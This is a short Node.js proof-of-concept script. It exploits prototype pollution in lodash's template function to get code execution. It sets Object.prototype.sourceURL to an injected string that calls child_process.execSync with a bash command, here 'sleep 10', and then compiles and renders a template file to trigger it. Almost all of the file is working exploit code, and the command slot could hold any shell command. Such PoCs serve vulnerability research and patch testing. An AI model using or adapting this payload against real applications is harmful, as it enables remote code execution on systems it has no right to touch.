const lodash = require('lodash')
const fs = require('fs')

/**
 * Polluted Payload
 */
Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'sleep 10'`)}\u000a//"

console.log("=".repeat(20) + "start" + "=".repeat(20) + "\n");

/**
 * Exported function call
 */
fs.readFile(__dirname+'/template.ejs', (err, content) => {
    let compiled = lodash.template(content)
    let rendered = compiled({
        language: 'a', 
        category: 'b'
    })
})

// for node-find-undefined
console.log("=".repeat(20) + "end" + "=".repeat(20) + "\n");
